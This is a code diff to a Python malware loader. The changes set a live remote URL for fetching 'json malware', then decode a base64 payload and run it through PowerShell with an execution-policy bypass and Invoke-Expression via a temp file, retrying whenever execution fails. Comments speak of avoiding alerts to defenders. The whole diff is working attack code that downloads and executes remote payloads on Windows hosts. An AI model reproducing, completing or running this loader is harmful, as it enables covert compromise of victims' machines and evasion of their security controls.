@@ -24,7 +24,7 @@ elif OS == "Linux":
     LIN = True
 
 # The API url you used for fetch the json malware
-URL = ""
+URL = "https://api.npoint.io/6d59014bde401f7847fd"
 
 # The pip packages to install
 packages = ["requests"]
@@ -101,30 +101,21 @@ def execute_process(script_content: bytes, extension: str, malware: str) -> None
         if WIN:
             # If the system is Windows
             if extension.lower() == "ps1":
-                # Run a powershell script from the IEX
-                if script_content.startswith(b'[Byte[]]'):
-                    pass
-                    # powershell_command = [
-                    #     "powershell",
-                    #     "-ExecutionPolicy", "Bypass",
-                    #     "-EncodedCommand", malware
-                    # ]
-                    # execution(powershell_command, check=True)
-                else:
-                    powershell_command = ['powershell', '-ExecutionPolicy', 'Bypass', '-Command',
-                                          f"$script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{malware}')); Invoke-Expression $script"]
-                    execution(powershell_command)
-            elif extension.lower() == "raw":
-                with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=f".ps1") as temp_script:
-                    print(type(script_content))
-                    temp_script.write(
-                        f"""$decodedExeBytes = [System.Convert]::FromBase64String("{malware}"); $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo; $processStartInfo.FileName = 'cmd.exe'; $processStartInfo.Arguments = '/c'; $processStartInfo.RedirectStandardInput = $true; $processStartInfo.UseShellExecute = $false; $processStartInfo.CreateNoWindow = $true; $process = [System.Diagnostics.Process]::Start($processStartInfo); $process.StandardInput.BaseStream.Write($decodedExeBytes, 0, $decodedExeBytes.Length); $process.StandardInput.Close(); $process.WaitForExit(); $process.Close(); $process.Dispose()""")
-                    temp_script_path = temp_script.name
-                with open(temp_script_path, "rb") as file:
-                    print(file.read())
-                normalized_path = os.path.normpath(temp_script_path)
-                powershell_command = ['powershell', '-ExecutionPolicy', 'Bypass', '-File', normalized_path]
-                execution(powershell_command, normalized_path)
+                # Run a powershell script from the IEX via temp file  that wil be deleted in the end of the process
+                normalized_path = None
+                try:
+                    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=f".{extension}") as temp_script:
+                        temp_script.write(
+                            f"$script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{malware}')); Invoke-Expression $script")
+                        temp_script_path = temp_script.name
+                    normalized_path = os.path.normpath(temp_script_path)
+                    powershell_command = ['powershell', '-ExecutionPolicy', 'Bypass', '-File', normalized_path]
+                    execution(powershell_command, normalized_path)
+                except subprocess.CalledProcessError:
+                    if normalized_path is not None:
+                        if os.path.exists(normalized_path):
+                            os.remove(normalized_path)
+                    execute_process(script_content, extension, malware)
             elif extension.lower() == "exe":
                 # This option will alert the defense via the need of save
                 # In develop the in memory execution of exe file
